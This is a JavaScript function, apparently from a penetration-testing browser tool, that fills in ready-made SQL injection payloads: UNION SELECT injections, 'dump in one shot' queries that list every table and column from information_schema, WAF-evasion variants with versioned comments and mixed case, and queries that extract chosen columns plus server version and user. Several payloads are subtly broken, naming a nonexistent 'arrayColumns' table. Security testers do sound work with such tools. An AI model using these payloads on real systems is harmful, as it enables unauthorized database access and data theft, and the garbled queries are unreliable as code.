function setUnionBased(id) {
	...
	switch (id) {
		...
		case "unintplus3":
			iPrompt(function (str) {
				setSelectedText(
					"+UNION(SELECT(" + arrayColumns(str).join("),(") + ")" + ")",
				);
			});
			break;
		...
		case "unullplus2":
			iPrompt(function (str) {
				rep = iNull(str);
				setSelectedText(
					"+UNION+ALL+SELECT+" + rep.substr(0, rep.length - 1) + "",
				);
			});
			break;
		...
		case "localdios1":
			iPrompt(function (str) {
				setSelectedText(
					" div @s:=( concat(@c:=0x00,if((select count(*)/*!50000from*/ /*!50000information_schema*/.arrayColumns where table_schema=database/**X**/() and @c:=concat(@c, 0x3c62723e, /*!50000table_name*/,0x2e,/*!50000column_name*/)),0x00,0x00),@c)) /*!50000union*/ select " +
						arrayColumns(str).join(","),
				);
			});
			break;
		...
		case "localdios2":
			iPrompt(function (str) {
				setSelectedText(
					" +DiV@x:=(Select+export_set(5,@:=0,(select+count(*)from(/*!50000information_schema*/.columns)where@:=export_set(5,export_set(5,@,/*!50000table_name*/,0x3c6c693e,2),/*!50000column_name*/,0xa3a,2)),@,2)) /*!50000union*/+ALL+SELECT+" +
						arrayColumns(str).join(","),
				);
			});
			break;
		...
		case "localdios3":
			iPrompt(function (str) {
				setSelectedText(
					" and@:=(seleCt GrOup_ConcAt(0x3c62723e,Table_name,column_name) frOm /*!50000information_schema.arrayColumns*/ where table_schema not like 0x696e666f726d6174696f6e5f736368656d61) /*!50000Union*/ Select " +
						arrayColumns(str).join(","),
				);
			});
			break;
		...
		case "localdios4":
			iPrompt(function (str) {
				setSelectedText(
					" and@x:=(/*!50000SELECT */GROUP_CONCAT(/*!50000table_name*/,0x2d2d2d3e,/*!50000column_Name*/ SEPARATOR 0x3c62723e)/*!50000FROM *//*!50000INFORMATION_SCHEMA*/.arrayColumns WHERE TABLE_SCHEMA=DATABASE/**!**/())  /*!50000union*/ ALL /*!50000select*/" +
						arrayColumns(str).join(","),
				);
			});
			break;
		...
		case "localdios6":
			iPrompt(function (str) {
				setSelectedText(
					"and@x:=(Select+/*!50000export_set*/(5,@:=0,(select+count(*)from(/*!50000information_schema.arrayColumns*/)where@:=export_set(5,/*!50000export_set*/(5,@,/*!50000table_name*/,0x3c6c693e,2),/*!50000column_name*/,0xa3a,2)),@,2))/*!50000UNION*/ ALL SELECT " +
						arrayColumns(str).join(","),
				);
			});
			break;
		...
		case "localdios8":
			iPrompt(function (str) {
				setSelectedText(
					"and@:=(SeLeCt /*!50000GrOup_ConCat(0x3c6c693e,/*!50000TaBle_naMe,0x207e20,/*!50000ColuMn_naMe*/)FrOm /*!50000inForMatiOn_scHeMa*/.arrayColumns where table_schema=database/**_**/()) /*!50000union*/ select " +
						arrayColumns(str).join(","),
				);
			});
			break;
		...
		case "runquery":
			setSelectedText(
				"(SELECT+CONCAT(info)+FROM+INFORMATION_SCHEMA.PROCESSLIST)",
			);
			break;
		...
		case "db3":
			setSelectedText(
				"(select group_Concat(0x3c62723e,table_schema) from {f information_schema.tables} where table_name = 'admin')",
			);
			break;
		...
		case "db4":
			setSelectedText(
				"(select /*!50000group_Concat(*/table_schema) from {f information_schema.tables} where table_name = 'admin')",
			);
			break;
		...
		case "tbl1":
			...
			iPrompt(function (str) {
				...
				setSelectedText(
					"(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=" +
						dbNameFinal +
						")",
				);
			});
		...
		case "clmn1":
			...
			iPrompt(function (str) {
				...
				setSelectedText(
					"(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=" +
						tblNameFinal +
						")",
				);
			});
		...
		case "data1":
			iPrompt(function (database) {
				...
				cols = prompt(
					"Insert columns to dump",
					"column_1,0x3a,column_2,0x3a,column_3",
				);
				setSelectedText(
					"(SELECT+GROUP_CONCAT(" +
						cols +
		...
		case "data2":
			iPrompt(function (database) {
				...
				setSelectedText(
					"(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" +
						Db +
						"." +
						table +
						")WHERE(@x)IN(@x:=CONCAT(0x20,@x," +
						cols +
						",0x3c62723e))))x)",
				);
			});
		...
		case "data3":
			iPrompt(function (database) {
				...
				setSelectedText(
					"(SELECT+GROUP_CONCAT(0x3c62723e," +
						cols +
						")+FROM (" +
						Db +
						"." +
		...
		case "data4":
			iPrompt(function (database) {
				...
				setSelectedText(
					"concat(0x416c69656e205368616e75203a3a20,version(),0x3a3a3a,user(),0x3a3a3a,database(),(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" +
						Db +
						"." +
						table +
						")WHERE(@x)IN(@x:=CONCAT(0x20,@x," +
		...
		case "diosmad1":
			setSelectedText(
				"(Select+export_set(5,@:=0,(select+count(*)from(information_schema.arrayColumns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))",
			);
			break;
		...
		case "diosmadwaf":
			setSelectedText(
				"export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.arrayColumns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)",
			);
			break;
		...
		case "diosmad_X":
			setSelectedText(
				"+and@x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.arrayColumns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT+",
			);
			break;
		...
		case "dioszen1":
			setSelectedText(
				"make_set(6,@:=0x0a,(select(1)from(information_schema.arrayColumns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",
			);
			break;
		...
		case "dioszen2":
			setSelectedText(
				"/*!50000make_set(6,@:=0x0a,(select(1)from(information_schema.arrayColumns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)*/",
			);
			break;
		...
		case "dioszenwaf":
			setSelectedText(
				"(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`arrayColumns`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)",
			);
			break;
